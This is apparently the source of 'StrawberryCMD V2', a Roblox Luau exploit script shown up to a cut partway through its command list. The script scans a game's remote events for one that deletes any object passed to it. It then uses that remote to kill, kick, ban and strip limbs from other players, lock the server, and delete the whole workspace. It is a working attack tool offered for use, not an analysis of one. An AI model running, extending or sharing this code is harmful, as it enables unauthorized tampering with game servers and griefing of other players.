--[[
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠶⣦⣤⣀⡀⠀⢀⣴⠞⠻⣧⠀⠀⠀⠀⢀⣤⣶⣿⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠈⠙⠳⣾⡇⠀⠀⢹⡇⠀⣠⡴⠟⢉⣹⣿⡀⠀⠀
    ⠀⠀⠀⠀⠀⠀⢀⡤⠖⠋⠙⢿⣆⠀⠉⠉⠒⢌⣳⡄⢀⠀⣷⣞⣥⠶⠛⠋⠉⠉⠀⠀⠀
    ⠀⠀⠀⠀⢀⡴⠋⠀⢀⠤⣦⠀⠙⠳⣤⣀⣀⣀⣙⣿⣼⣴⣿⠿⠗⠶⢶⣤⡀⠀⠀⠀⠀
    ⠀⠀⠀⣠⠏⠀⠀⠀⠸⠿⠋⠀⠀⣠⣾⠿⠋⠡⠼⠻⣿⣿⡿⢏⡉⠑⠢⡉⠻⢷⣤⣀⡀
   ⠀⠀⢠⠏⣠⠚⡷⠀⠀⠐⣤⣴⣾⠛⠁⠀⠀⢀⣤⡾⣿⡀⠉⢢⠙⢦⣤⣤⣤⣶⡿⠛⠁
   ⠀⢀⡏⠀⠛⠛⠁⠀⠀⣀⣀⠉⠛⠿⠿⠿⠿⠟⠋⠀⠸⣷⣤⡀⠣⠈⢿⣯⠁⠀⠀⠀⠀
   ⠀⣸⠁⠀⠀⠀⠀⠀⢰⣁⡼⠀⠀⠀⣀⣀⠀⠀⠀⠀⢀⡈⠻⠿⣶⣦⣼⣿⣇⠀⠀⠀⠀
   ⢀⡏⡴⢳⡄⠀⠀⠀⠈⠉⠀⠀⠀⣸⣅⣸⠆⠀⠀⢰⣇⣽⠀⠀⠀⠀⢠⠲⣿⡄⠀⠀⠀
   ⢸⠃⠿⠟⠀⠀⠀⠀⣴⠋⣧⠀⠀⠈⠉⠉⠀⠀⠀⠈⠛⠋⠀⠀⠀⠀⢸⣤⢿⡇⠀⠀⠀
   ⣾⠀⠀⠀⣠⣄⠀⠀⢻⡾⠃⠀⠀⠀⠀⢠⡤⣤⠀⠀⠀⠀⡴⠛⡦⠀⠈⠁⣾⠃⠀⠀⠀
   ⣿⠀⠀⢰⣧⣼⡇⠀⠀⠀⠀⠀⠀⠀⢰⣿⣤⠞⠀⠀⠀⠀⢿⠾⠃⠀⢀⣼⠏⠀⠀⠀⠀
   ⣿⠀⠀⠀⠛⠁⠀⠀⠀⢠⠖⢲⠀⠀⠀⠉⠀⠀⠀⠀⢀⣀⡀⠀⢀⣴⠿⠁⠀⠀⠀⠀⠀
   ⣿⡄⢠⠤⡀⠀⠀⠀⠀⢺⣴⠟⠀⠀⣠⠖⢲⡄⠀⣰⣏⡸⢃⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀
   ⢻⣷⢸⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠶⠛⠀⠀⠈⣩⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⢿⣧⠉⠀⠀⡴⢳⠀⠀⢀⣴⢒⡆⠀⠀⠀⣠⣴⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠈⠻⣷⣄⡀⠷⠛⠀⠀⠘⠿⣟⣡⣤⡶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠈⠛⠿⢷⣶⣶⣶⡾⠿⠟⠋⠁⠀⠀⠀⠀
   
   Welcome to StrawberryCMD V2!
   
   StrawberryCMD is the only remote admin script you'll ever need, we've got
   everything you could ask for with the help of the community fueling us
   with enough ideas to keep us going!
   
   Features that most of the other remote admin scripts DON'T have:
     - Remote logging | Explanation: Every time a remote is found it is logged in your executor's workspace (soon will be logged to webste) with the directory to the remote and the game PlaceId so every time you join that game again you don't have to worry abour rescanning, unless the game removes that remote.
     - Plugin compatibility | Explanation: People can make their own commands and other things with LuaU and add them into the StrawberryCMD folder in the workspace.
     - Can work without remotes | Explanation: We're planning to make it so that StrawberryCMD doesn't need remotes and can just work as a typical admin script, but the remote admin will still be the main focus.
   
   Credits:
     C:\Drive: Re-making the scanner, making the new ui and commands.
     Saji: Commands and Base Scanner
     Ghost.: Chat commmands, command fixing, and importing.
     Hailey: Fixing the "findtargets" function (since I made it at night lol)
     
   .gg/txsR9w5bUD <--- Official server for StrawberryCMD
]]--

--// Config
local config = {
	test_mode = true, --// What do you even do?
	current_version = 1.0,
	open_button = Enum.KeyCode.Semicolon,
	gui_ready = false,
	time_out = 0.32,
	found_vuln = false,
	remote = nil,
	test_part = game:GetService("Players").LocalPlayer:FindFirstChildWhichIsA("StarterGear"),
	blacklisted_strings = {
		"cheatdetected", 
		"exploitdetected",
		"mouselock",
		"mouseloc"
	},
	likely_strings = {
		"delete",
		"deletion",
		"remove",
		"clear",
		"clean",
		"wipe",
		"despawn",
	},
	ui = {
		corner_radius = UDim.new(0,12),
		tween_speed = 0.3,
		background_color = Color3.fromRGB(36, 36, 36),
		background_transparency = 0,
		border_color = Color3.fromRGB(81, 81, 81),
		border_transparency = 0,
		text_color = Color3.fromRGB(255, 255, 255),
		text_transparency = 0.6,
		font = {
			normal = Enum.Font.BuilderSans,
			bold = Enum.Font.BuilderSansMedium,
		},
	},
}

if not config.test_part then
	config.test_part = game:GetService("Players").LocalPlayer.Character:WaitForChild("Head",3)
end

--// Services
local lighting = game:GetService("Lighting")
local players = game:GetService("Players")
local playergui = game:GetService("Players").LocalPlayer.PlayerGui
local runservice = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local tween = game:GetService("TweenService")
local debris = game:GetService("Debris")
local TTC = game:GetService("TextChatService"):FindFirstChild("TextChatCommands")

--// LocalPlayer
local camera = workspace:FindFirstChild("Camera")
local player = players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local mouse = player:GetMouse()
local limbs = {
	head = char:WaitForChild("Head",3),
	hrp = char:WaitForChild("HumanoidRootPart",3),
	humanoid = char:FindFirstChildWhichIsA("Humanoid"),
	R6 = {
		"Torso",
		"Left Arm",
		"Right Arm",
		"Left Leg",
		"Right Leg"
	},
	R15 = {
		"UpperTorso",
		"LowerTorso",
		"LeftUpperArm",
		"LeftLowerArm",
		"LeftHand",
		"RightUpperArm",
		"RightLowerArm",
		"RightHand",
		"LeftUpperLeg",
		"LeftLowerLeg",
		"LeftFoot",
		"RightUpperLeg",
		"RightLowerLeg",
		"RightFoot",
	},
}

--// Setup
local ismobile = uis.TouchEnabled
player.CharacterAdded:Connect(function(c)
	char = c
end)

--// Gui
local guiopen = false
local debounce = false
local originalfov = camera.FieldOfView

local blur = Instance.new("BlurEffect",lighting)
blur.Size = 0
blur.Name = "StrawberryBlur"
local gui = Instance.new("ScreenGui",playergui)
gui.Name = "Strawberry"
gui.ResetOnSpawn = false
gui.DisplayOrder = 1999999999
local bar = Instance.new("Frame",gui)
bar.Name = "CommandBar"
bar.Size = UDim2.new(0,450,0,50)
bar.BackgroundColor3 = config.ui.background_color
bar.BackgroundTransparency = config.ui.background_transparency
bar.BorderSizePixel = 0
bar.AnchorPoint = Vector2.new(0.5,0.5)
bar.Position = UDim2.new(0.5,0,0.5,0)
bar.Visible = guiopen
bar.ClipsDescendants = true
local uicorner_bar = Instance.new("UICorner",bar)
uicorner_bar.CornerRadius = config.ui.corner_radius
local border_bar = Instance.new("UIStroke",bar)
border_bar.Color = config.ui.border_color
border_bar.Thickness = 1
border_bar.BorderStrokePosition = Enum.BorderStrokePosition.Inner
border_bar.Transparency = config.ui.border_transparency
local searchicon = Instance.new("ImageLabel",bar)
searchicon.Name = "Icon"
searchicon.BackgroundTransparency = 1
searchicon.Size = UDim2.new(0,28,0,28)
searchicon.Image = "rbxassetid://75392683168829"
searchicon.ImageTransparency = 0.6
searchicon.AnchorPoint = Vector2.new(0,0.5)
searchicon.Position = UDim2.new(0,12,0.5,0)
local textbox = Instance.new("TextBox",bar)
textbox.Name = "TextBox"
textbox.Size = UDim2.new(1,-46,1,0)
textbox.Position = UDim2.new(0,46,0,0)
textbox.BackgroundTransparency = 1
textbox.Font = config.ui.font.normal
textbox.TextColor3 = config.ui.text_color
textbox.TextSize = 24
textbox.TextXAlignment = Enum.TextXAlignment.Left
textbox.Text = ""
textbox.TextTransparency = 0.6
textbox.PlaceholderText = "Type a command"
textbox.ZIndex = 2
textbox.ClearTextOnFocus = false
local predict = Instance.new("TextLabel",bar)
predict.Name = "PredictCommand"
predict.Size = UDim2.new(1,-46,1,0)
predict.Position = UDim2.new(0,46,0,0)
predict.BackgroundTransparency = 1
predict.Font = config.ui.font.normal
predict.TextColor3 = config.ui.text_color
predict.TextSize = 24
predict.TextXAlignment = Enum.TextXAlignment.Left
predict.Text = ""
predict.TextTransparency = config.ui.text_transparency + 0.2

local cmdlist = Instance.new("Frame",gui)
cmdlist.Name = "CommandBar"
cmdlist.Size = UDim2.new(0,250,0,400)
cmdlist.BackgroundColor3 = config.ui.background_color
cmdlist.BackgroundTransparency = config.ui.background_transparency
cmdlist.BorderSizePixel = 0
cmdlist.AnchorPoint = Vector2.new(0.5,0.5)
cmdlist.Position = UDim2.new(0.5,0,0.5,0)
cmdlist.Visible = false
cmdlist.ClipsDescendants = true
local uicorner_cmdlist = Instance.new("UICorner",cmdlist)
uicorner_cmdlist.CornerRadius = config.ui.corner_radius
local border_cmdlist = Instance.new("UIStroke",cmdlist)
border_cmdlist.Color = config.ui.border_color
border_cmdlist.Thickness = 1
border_cmdlist.BorderStrokePosition = Enum.BorderStrokePosition.Inner
border_cmdlist.Transparency = config.ui.border_transparency
Instance.new("UIDragDetector",cmdlist)
local searchicon2 = Instance.new("ImageLabel",cmdlist)
searchicon2.Name = "Icon"
searchicon2.BackgroundTransparency = 1
searchicon2.Size = UDim2.new(0,28,0,28)
searchicon2.Image = "rbxassetid://75392683168829"
searchicon2.ImageTransparency = 0.6
searchicon2.Position = UDim2.new(0,12,0,12)
local textbox2 = Instance.new("TextBox",cmdlist)
textbox2.Name = "TextBox"
textbox2.Size = UDim2.new(1,-46,0,50)
textbox2.Position = UDim2.new(0,46,0,0)
textbox2.BackgroundTransparency = 1
textbox2.Font = config.ui.font.normal
textbox2.TextColor3 = config.ui.text_color
textbox2.TextSize = 24
textbox2.TextXAlignment = Enum.TextXAlignment.Left
textbox2.Text = ""
textbox2.TextTransparency = 0.6
textbox2.PlaceholderText = "Search commands"
textbox2.ZIndex = 2
textbox2.ClearTextOnFocus = false
local divider = Instance.new("Frame",cmdlist)
divider.Name = "Divider"
divider.Size = UDim2.new(1,-100,0,1)
divider.BorderSizePixel = 0
divider.BackgroundColor3 = config.ui.border_color
divider.AnchorPoint = Vector2.new(0.5,0)
divider.Position = UDim2.new(0.5,0,0,45)
local scroll_cmdlist = Instance.new("ScrollingFrame",cmdlist)
scroll_cmdlist.Name = "ScrollingFrame"
scroll_cmdlist.Size = UDim2.new(1,0,1,-50)
scroll_cmdlist.Position = UDim2.new(0,0,0,50)
scroll_cmdlist.BackgroundTransparency = 1
scroll_cmdlist.BorderSizePixel = 0
scroll_cmdlist.ScrollBarThickness = 8
scroll_cmdlist.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
scroll_cmdlist.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
scroll_cmdlist.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll_cmdlist.CanvasSize = UDim2.new(0,0,0,0)
scroll_cmdlist.CanvasPosition = Vector2.new(0,0)
local uilist_cmdlist = Instance.new("UIListLayout",scroll_cmdlist)
uilist_cmdlist.Padding = UDim.new(0,6)

local notifpanel = Instance.new("Frame",gui)
notifpanel.Name = "NotificationPanel"
notifpanel.Size = UDim2.new(0,200,1,-50)
notifpanel.BackgroundTransparency = 1
notifpanel.Position = UDim2.new(1,-205,0,0)
local uilist = Instance.new("UIListLayout",notifpanel)
uilist.Padding = UDim.new(0,6)
uilist.VerticalAlignment = Enum.VerticalAlignment.Bottom

if ismobile then
	bar.Position = UDim2.new(0.5,0,0.5,-125)
	Instance.new("UIDragDetector",bar)
	local mobilebtn = Instance.new("TextButton",gui)
	mobilebtn.Name = "MobileOpen"
	mobilebtn.Size = UDim2.new(0,55,0,55)
	mobilebtn.AnchorPoint = Vector2.new(0.5,0.5)
	mobilebtn.Position = UDim2.new(0.5,0,0.1,0)
	mobilebtn.BackgroundTransparency = 0.2
	mobilebtn.BackgroundColor3 = config.ui.background_color
	mobilebtn.BorderSizePixel = 0
	mobilebtn.Text = ""
	mobilebtn.AutoButtonColor = false
	local corner_mobilebtn = Instance.new("UICorner",mobilebtn)
	corner_mobilebtn.CornerRadius = UDim.new(1,0)
	local image = Instance.new("ImageLabel",mobilebtn)
	image.Name = "Icon"
	image.BackgroundTransparency = 1
	image.Image = "rbxassetid://77737785327225"
	image.AnchorPoint = Vector2.new(0.5,0.5)
	image.Position = UDim2.new(0.5,0,0.5,0)
	image.Size = UDim2.new(0.85,0,0.85,0)
	local corner_image = Instance.new("UICorner",image)
	corner_image.CornerRadius = UDim.new(1,0)
	local drag = Instance.new("UIDragDetector",mobilebtn)
end

local function opengui()
	bar.Size = UDim2.new(0, 0, 0, 0)
	bar.Visible = true
	bar:TweenSize(UDim2.new(0, 450, 0, 50), "Out", "Sine", config.ui.tween_speed, true)
	tween:Create(blur, TweenInfo.new(config.ui.tween_speed), { Size = 24 }):Play()
	tween:Create(camera, TweenInfo.new(config.ui.tween_speed), { FieldOfView = originalfov - 20 }):Play()
	task.wait()
	textbox:CaptureFocus()
end

local function closegui()
	bar:TweenSize(UDim2.new(0, 0, 0, 0), "Out", "Sine", config.ui.tween_speed, true)
	tween:Create(blur, TweenInfo.new(config.ui.tween_speed), { Size = 0 }):Play()
	tween:Create(camera, TweenInfo.new(config.ui.tween_speed), { FieldOfView = originalfov }):Play()
	textbox:ReleaseFocus()
end

textbox.FocusLost:Connect(function()
	textbox.Text = ""
	predict.Text = ""
	closegui()
	guiopen = false
end)

uis.InputBegan:Connect(function(input, processed)
	if not config.gui_ready then return end
	if ismobile then return end
	if processed then return end
	if input.KeyCode == config.open_button then
		if debounce then return end
		debounce = true

		if not guiopen then
			opengui()
			guiopen = true
		else
			closegui()
			guiopen = false
		end

		task.wait(config.ui.tween_speed)
		debounce = false
	end
end)

if ismobile then
	local mobilebtn: TextButton = gui:WaitForChild("MobileOpen",5)
	mobilebtn.TouchTap:Connect(function()
		if debounce then return end
		debounce = true

		if not guiopen then
			opengui()
			guiopen = true
		else
			closegui()
			guiopen = false
		end

		task.wait(config.ui.tween_speed)
		debounce = false
	end)
end
--// Functions
local function selfdestruct()
	gui:Destroy()
end

local function notification(description, duration)
	local sound = Instance.new("Sound",workspace)
	sound.Name = "NotificationSound"
	sound.SoundId = "rbxassetid://8551372796"
	sound.Volume = 0.5
	sound.PlayOnRemove = true
	sound:Destroy()
	local holder = Instance.new("Frame",notifpanel)
	holder.Name = "Notification"
	holder.BackgroundTransparency = 1
	holder.Size = UDim2.new(1,0,0,75)
	local notif = Instance.new("Frame", holder)
	notif.Name = "Main"
	notif.Size = UDim2.new(1, 0, 1, 0)
	notif.BackgroundColor3 = config.ui.background_color
	notif.BackgroundTransparency = config.ui.background_transparency
	notif.BorderSizePixel = 0
	notif.Position = UDim2.new(1, 1, 0, 0)
	local corner = Instance.new("UICorner")
	corner.CornerRadius = config.ui.corner_radius
	corner.Parent = notif
	local border = Instance.new("UIStroke")
	border.Color = config.ui.border_color
	border.Thickness = 1
	border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	border.Transparency = config.ui.border_transparency
	border.Parent = notif
	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Text = "StrawberryCMD"
	title.BackgroundTransparency = 1
	title.Size = UDim2.new(1, 0, 0, 25)
	title.Font = config.ui.font.normal
	title.TextColor3 = config.ui.text_color
	title.TextSize = 20
	title.Position = UDim2.new(0, 0, 0, 1)
	title.TextTransparency = config.ui.text_transparency - 0.15
	title.Parent = notif
	local desc = Instance.new("TextLabel")
	desc.Name = "Description"
	desc.Text = description
	desc.BackgroundTransparency = 1
	desc.Size = UDim2.new(1, -15, 1, -34)
	desc.Font = config.ui.font.normal
	desc.TextColor3 = config.ui.text_color
	desc.TextScaled = true
	desc.AnchorPoint = Vector2.new(0.5, 0)
	desc.Position = UDim2.new(0.5, 0, 0, 27)
	desc.TextTransparency = config.ui.text_transparency
	desc.Parent = notif
	notif:TweenPosition(UDim2.new(0,0,0,0),"Out","Sine",config.ui.tween_speed,true)
	task.spawn(function()
		task.wait(duration)
		notif:TweenPosition(UDim2.new(1,1,0,0),"Out","Sine",config.ui.tween_speed,true)
		task.wait(config.ui.tween_speed)
		holder:Destroy()
	end)
end


local function checkremote(remote: RemoteEvent | RemoteFunction)
	for _, str in ipairs(config.blacklisted_strings) do
		if string.find(remote.Name:lower(), str:lower()) then
			return false
		end
	end

	if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" or remote.Name == "CharacterSoundEvent" then
		return false
	end

	if remote.Parent and remote.Parent.Parent then
		if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
			return false
		end
		if remote.Parent.Name == "RobloxReplicatedStorage"
			or remote.Parent.Name == "DefaultChatSystemChatEvents" then
			return false
		end
	end

	return true
end

local function isdestroyed()
	return not config.test_part:IsDescendantOf(game)
end

local function testremote(remote: RemoteEvent | RemoteFunction)
	pcall(function()
		if remote:IsA("RemoteEvent") then
			remote:FireServer(config.test_part)
		elseif remote:IsA("RemoteFunction") then
			coroutine.wrap(function()
				remote:InvokeServer(config.test_part)
			end)
		end
	end)

	local t = tick()

	while tick() - t < config.time_out do
		if isdestroyed() then
			return true
		end
		task.wait()
	end

	return false
end

--// Scanning
local timer = 0
local priority = {}
local remotes = {}

coroutine.wrap(function()
	repeat
		timer += 1
		task.wait(1)
	until config.found_vuln
end)()

for _, remote: RemoteEvent | RemoteFunction in ipairs(game:GetDescendants()) do
	if remote.Parent == nil then continue end
	if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
		if checkremote(remote) then
			for _, str in ipairs(config.likely_strings) do
				if string.find(remote.Name:lower(), str:lower()) then
					table.insert(priority, remote)
					break
				end
			end
			table.insert(remotes, remote)
		end
	end
end

notification("Scanning: "..tostring(#remotes + #priority).." remotes\nEstimated time: "..tostring((#remotes + #priority) * config.time_out),3)
print("Strawscan V2 | Scanning: "..tostring(#remotes + #priority).." remotes\nEstimated time: "..tostring((#remotes + #priority) * config.time_out))

for _, remote in ipairs(priority) do
	print("Strawscan V2 | Testing: "..remote.Name)
	if testremote(remote) then
		print("Strawscan V2 | Test succesful:\n"..remote:GetFullName())
		config.found_vuln = true
		config.remote = remote
		break
	end
	print("Strawscan V2 | Test unsuccesful: "..remote.Name)
end

if not config.found_vuln and not config.remote then
	for _, remote in ipairs(remotes) do
		if testremote(remote) then
			config.found_vuln = true
			config.remote = remote
			break
		end
	end
end

if config.found_vuln then
	config.gui_ready = true
	notification("Found vulnurabilty! Took: "..tostring(timer).." seconds | Remote name: "..config.remote.Name,3)
	print("Strawscan V2 | Found vulnurabilty! Took: "..tostring(timer).." seconds | Remote name: "..config.remote.Name)
	if ismobile then
		notification("Click the button with the strawberry cat to use the commands!",10)
	else
		notification("Press \""..string.gsub(tostring(config.open_button),"Enum.KeyCode.","").."\" to open the command bar! The chat prefix is: /",10)
	end
else
	notification("No vulnurabilty, closing script safely",3)
	print("Strawscan V2 | No vulnurabilty, closing script safely")
	wait(5)
	if not config.test_mode then
		selfdestruct()
		return
	end
end

--// Commands
local function delete(object)
	if not object or not object:IsDescendantOf(game) then return end
	pcall(function()
		if config.remote:IsA("RemoteEvent") then
			config.remote:FireServer(object)
		elseif config.remote:IsA("RemoteFunction") then
			coroutine.wrap(function()
				config.remote:InvokeServer(object)
			end)()
		end
	end)
end


local function findtargets(target)
	if not target then
		return {}
	end

	local players = game:GetService("Players") 
	target = string.lower(target)
	if target == "me" then
		return { player }
	elseif target == "all" then
		local targetplayers = {}
		for _, vplayer in ipairs(players:GetPlayers()) do
			if vplayer.Character then
				table.insert(targetplayers, vplayer)
			end
		end
		return targetplayers
	elseif target == "others" then
		local targetplayers = {}
		for _, vplayer in ipairs(players:GetPlayers()) do
			if vplayer.Character and vplayer.DisplayName ~= player.DisplayName then
				table.insert(targetplayers, vplayer)
			end
		end
		return targetplayers
	else
		for _, plr in ipairs(players:GetPlayers()) do
			if string.find(string.lower(plr.DisplayName), target) or string.find(string.lower(plr.Name), target) then
				return { plr }
			end
		end
	end

	notification("Player not found, Did you type it in right?",3)
	return {}
end

-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD
-- NOTE FOR DEVS: "player" VARIABLE SHOULD NOT BE USED FOR COMMANDS, UNLESS ITS FOR LOCALPLAYER. USE "plr" INSTEAD

local admins = {}
local curpayers = {}
local banned = {}
local loopkill = {}
local slock = false

local commands = {
--[[   THIS DOES NOT WORK FOR UNKNOWN REASON WILL WORK ON LATER
	{
		name = "KillAura",
		desc = "Description coming soon!",
		code = function(onoroff)

			local partsize = 10
			local killauraactive = true 
			local killaurapart
			if onoroff == "off" then killauraactive=false end
			if onoroff == "on" then 

				print("Kill aura activated!")
				local lp: Player = game:GetService("Players").LocalPlayer
				if not lp then return end
				local char = lp.Character
				if not char or not char:FindFirstChild("HumanoidRootPart") then return end

				if not killauraactive then
					if killaurapart and killaurapart.Parent then
						killaurapart:Destroy()
						killaurapart = nil
					end
					return
				end

				if killaurapart and killaurapart.Parent then
					killaurapart:Destroy()
				end

				local part = Instance.new("Part")
				part.Size = Vector3.new(partsize, partsize, partsize)
				part.Transparency = 0.5
				part.BrickColor = BrickColor.new("Bright red")
				part.Material = Enum.Material.Neon
				part.Shape = Enum.PartType.Ball
				part.Anchored = false
				part.CanCollide = false
				part.Name = "Strawberry_Killaura123"
				part.CFrame = char.HumanoidRootPart.CFrame
				part.Parent = workspace

				local weld = Instance.new("WeldConstraint")
				weld.Part0 = char.HumanoidRootPart
				weld.Part1 = part
				weld.Parent = part
				part.Touched:Connect(function(hit)
					local plr = game:GetService("Players"):GetPlayerFromCharacter(hit.Parent)
					if plr and plr ~= lp then
						local head = plr.Character and plr.Character:FindFirstChild("Head")
						if head then
							delete(head)
							return
						end
					end
				end)
				killaurapart = part
			end	
		end,
	},
--]]
	{
		name = "Kill",
		desc = "Description coming soon!",
		code = function(strin)
			print(strin)
			local targetlist = findtargets(strin) or {}
			for _, plr in ipairs(targetlist) do
				if plr and plr.Character then
					delete(plr.Character:FindFirstChild("Head"))
				end
			end
		end,
	},
	{
		name = "Kick",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				if plr then
					delete(plr)
				end
			end
		end,
	},
	{
		name = "Ban",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				if plr then
					if not table.find(banned,plr) then
						table.insert(banned,plr)
						delete(plr)
						task.spawn(function()
							players.PlayerAdded:Connect(function(plr)
								if not table.find(banned,plr.Name) then
									delete(plr)
								end
							end
							)
						end)
					end
				end
			end
		end,
	},
	{
		name = "Serverlock",
		desc = "Description coming soon!",
		code = function()
			for _, plr in pairs(players:GetPlayers()) do
				table.insert(curpayers,plr)
			end
			slock = true
			task.spawn(function()
				players.PlayerAdded:Connect(function(plr)
					if slock then
						if not table.find(curpayers,plr.Name) then
							delete(plr)
						end
					else
						task.cancel()
					end
				end
				)
			end)
			notification("Serverlock turned on!",3)
		end,
	},
	{
		name = "Unserverlock",
		desc = "Description coming soon!",
		code = function()
			slock = false
			curpayers = {}
			notification("Serverlock turned off!",3)
		end,
	},
	{
		name = "Brickify",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				if plr and plr.Character then
					delete(plr.Character:FindFirstChild("Humanoid"))
				end
			end
		end,
	},
	{
		name = "Blockhead",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				if plr and plr.Character then
					delete(plr.Character.Head:FindFirstChildWhichIsA("SpecialMesh"))
				end
			end
		end,
	},
	{
		name = "Punish",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				if plr then
					delete(plr.Character)
				end
			end
		end,
	},
	{
		name = "Ragdoll",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				if plr then
					delete(plr.Character:FindFirstChild("HumanoidRootPart"))
				end
			end
		end,
	},
	{
		name = "NukeGame",
		desc = "Description coming soon!",
		code = function()
			for _, instance in ipairs(workspace:GetDescendants()) do
				pcall(function()
					if instance:IsA("Camera") or instance:IsA("Terrain") then return end
					delete(instance)
				end)
			end
		end,
	},
	{
		name = "Korblox",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				local charater = plr.Character
				if plr and charater then
					if charater:FindFirstChild("Torso") then
						local part = charater:FindFirstChild("Right Leg")
						if part then delete(part) end
					elseif charater:FindFirstChild("UpperTorso") then
						local limbs = {
							"RightUpperLeg", "RightLowerLeg", "RightLeg"
						}
						for _, limb in ipairs(limbs) do
							local part = charater:FindFirstChild(limb)
							if part then delete(part) end
						end
					end
				end
			end
		end,
	},
	{
		name = "BTools",
		desc = "Description coming soon!",
		code = function()
			local equipped = true
			local oldicon = player:GetMouse().Icon
			local selection = Instance.new("SelectionBox",workspace)
			local rainbowinfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
			local h = 0
			local function hsvtocolor(h)
				return Color3.fromHSV(h, 1, 1)
			end
			coroutine.wrap(function()
				while task.wait() do
					h = (h + 0.3) % 1
					local goal = {}
					goal.Color3 = hsvtocolor(h)
					local tween = tween:Create(selection, rainbowinfo, goal)
					tween:Play()
					tween.Completed:Wait()
				end
			end)()
			selection.Name = "Strawberry"
			selection.LineThickness = 0.05
			selection.SurfaceTransparency = 0.8
			selection.SurfaceColor3 = Color3.new(1, 1, 1)
			local tool = Instance.new("Tool",player.Backpack)
			tool.Name = "Delete"
			tool.ToolTip = "Delete things!"
			tool.TextureId = "rbxassetid://12223874"
			tool.CanBeDropped = false
			tool.RequiresHandle = false
			tool.Equipped:Connect(function()
				oldicon = player:GetMouse().Icon
				equipped = true
				mouse.Icon = "rbxasset://textures//HammerCursor.png"
				while equipped do
					selection.Adornee = mouse.Target
					task.wait()
				end
			end)
			tool.Unequipped:Connect(function()
				equipped = false
				selection.Adornee = nil
				mouse.Icon = oldicon
			end)
			tool.Activated:Connect(function()
				delete(mouse.Target)
			end)
		end,
	},
	{
		name = "NoLimbs",
		desc = "Description coming soon!",
		code = function(string)
			local targetlist = findtargets(string)
			for _, plr in ipairs(targetlist) do
				local charater = plr.Character
				if plr and charater then
					if charater:FindFirstChild("Torso") then
						local limbs = {"Left Arm", "Left Leg", "Right Arm", "Right Leg"}
						for _, limb in ipairs(limbs) do
							local part = charater:FindFirstChild(limb)
							if part then delete(part) end
						end
					elseif charater:FindFirstChild("UpperTorso") then
						local limbs = {
							"LeftUpperArm", "LeftLowerArm", "LeftArm",
							"LeftUpperLeg", "LeftLowerLeg", "LeftLeg",
							"RightUpperArm", "RightLowerArm", "RightArm",
							"RightUpperLeg", "RightLowerLeg", "RightLeg"
						}
						for _, limb in ipairs(limbs) do
							local part = charater:FindFirstChild(limb)
							if part then delete(part) end
						end
					end
				end
			end
		end,
	},
	{
		name = "RemovePlrTools",
		desc = "Description coming soon!",
		code = function(string)
			local target = findtargets(string)
			target = target[1]
			for _, tools in ipairs(target.Backpack:GetChildren()) do
				print(tools.Name)
				if tools:IsA("Tool") then
					delete(tools)
				end
			end
		end,
	},
	{
		name = "Ragdoll",
		desc = "Description coming soon!",
		code = function(string)
			local target = findtargets(string)
			target = target[1]
			delete(target.Character:FindFirstChild("HumanoidRootPart"))
		end,
	},
	{
		name = "BlockHead",
		desc = "Description coming soon!",
		code = function(string)
			local target = findtargets(string)
			target = target[1]
			delete(target.Character.Head:FindFirstChildWhichIsA("SpecialMesh"))
		end,
	},
	{
		name = "RemoveMeshes",
